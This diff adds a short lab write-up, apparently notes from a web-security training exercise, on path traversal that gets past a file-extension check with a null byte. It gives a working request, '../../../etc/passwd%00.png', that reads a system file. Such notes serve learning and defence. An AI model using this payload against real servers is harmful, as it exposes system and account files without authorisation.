@@ -1,0 +1,19 @@
+Lab #6: File path traversal, validation of file extension with null byte bypass
+
+Target: Get access to the content of /etc/passwd
+
+Analysis:
+
+The image files are loaded with Get request.
+
+Challenge:  The application validates that the supplied filename ends with the expected file extension.
+
+GET /image?filename=/var/www/image/72.jpg
+
+send the request to the repeater and change the filename parameter as follows:
+
+
+GET /image?filename=../../../etc/passwd%00.png
+
+%00 is the null byte and says the server to ignore rest of the characters in the file path string.
+
